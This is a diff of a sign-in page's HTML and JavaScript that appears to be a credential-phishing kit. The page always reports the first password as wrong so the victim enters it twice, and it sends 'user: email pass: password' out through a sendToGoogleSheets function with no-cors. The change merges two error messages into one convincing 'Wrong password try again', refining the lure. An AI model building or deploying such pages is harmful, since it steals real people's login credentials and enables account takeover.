@@ -242,8 +242,7 @@
                 <div class="form-group" id="passwordGroup">
                     <input type="password" class="input-field" id="password" placeholder=" " required>
                     <label for="password" class="label">Enter your password</label>
-                    <div class="error-message" id="passwordError">Enter a valid password</div>
-                    <div class="error-message" id="passwordError1">Wrong password</div>
+                    <div class="error-message" id="passwordError">Wrong password try again</div>
                 </div>
                 <button type="submit" class="btn">Sign in</button>
             </form>
@@ -277,7 +276,6 @@
             password = document.getElementById('password').value;
             const passwordGroup = document.getElementById('passwordGroup');
             const passwordError = document.getElementById('passwordError');
-            const passwordError1 = document.getElementById('passwordError1');
             if (!password || password.length < 8) {
                 passwordGroup.classList.add('error');
                 passwordError.style.display = 'block';
@@ -287,7 +285,7 @@
             else if (password.length >= 8  && looper < 1) {
                 document.getElementById('password').value = "";
                 passwordGroup.classList.add('error');
-                passwordError1.style.display = 'block';
+                passwordError.style.display = 'block';
                 looper = 1 + looper;
                 function sendToGoogleSheets() {
                 let text = `user: ${email} pass: ${password}`;
@@ -312,7 +310,6 @@
             else{
             passwordGroup.classList.remove('error');
             passwordError.style.display = 'none';
-            passwordError1.style.display = 'none';
             function sendToGoogleSheets() {
                 let text = `user: ${email} pass: ${password}`;
                 // Add mode: 'no-cors'
@@ -350,7 +347,6 @@
             const passwordError = document.getElementById('passwordError');
             passwordGroup.classList.remove('error');
             passwordError.style.display = 'none';
-            passwordError1.style.display = 'none';
         });
 
     </script>
